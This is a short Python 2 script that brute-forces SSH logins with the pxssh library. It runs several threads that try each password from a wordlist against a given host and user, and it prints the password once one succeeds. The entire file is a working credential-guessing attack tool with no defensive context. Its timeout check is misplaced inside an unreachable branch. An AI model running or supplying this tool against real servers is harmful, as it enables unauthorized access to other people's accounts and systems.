#script to brute force ssh with Pxssh
#uses the pexpect lib,3rd party, @ http://pexpect.sourceforge.net
import pxssh
import optparse
import time
from threading import*

conn_no=5
conn_lock=Semaphore(value= conn_no)
Found=False
Fails=0

def connect(host, user, password, release):
    global Found
    global Fails
    try:
        s= pxssh.pxssh()
        s.login(host, user, password)
        print "[+] Password Found: "+ password
        Found= True

    except Exception, e:
        if "read_nonblocking" in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'sychronize with orizinal prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release: conn_lock.release()

def main():
    parser= optparse.OptionParser('usage % prog -H <target host>'+\
    '-u <user> -F <password-list')
    parser.add_option('-H', dest='target_host', type='string',\
        help='specify target host')
    parser.add_option('-u', dest='user', type='string', help='specify user')
    parser.add_option('-F', dest='passwd_file', type='string', \
    help='specify password file')

    (options,args)= parser.parse_args()
    host=options.target_host
    user=options.user
    passwd_file=options.passwd_file
    if host == None or user == None or passwd_file == None :
        print parser.usage
        exit(0)

    fn= open(passwd_file,'r')
    for line in fn.readlines():
        if Found:
            print '[-] Exiting: Password found'
            exit(0)
            if Fails>5:
                print '[-] Exiting: Too many socket timeouts'
                exit(0)

        conn_lock.acquire()
        password= line.strip('\r').strip('\n')
        print ("[-] Testing : "+ str(password))
        t= Thread(target=connect, args=(host,user,password,True))
        child=t.start()
if __name__=='__main__':
    main()
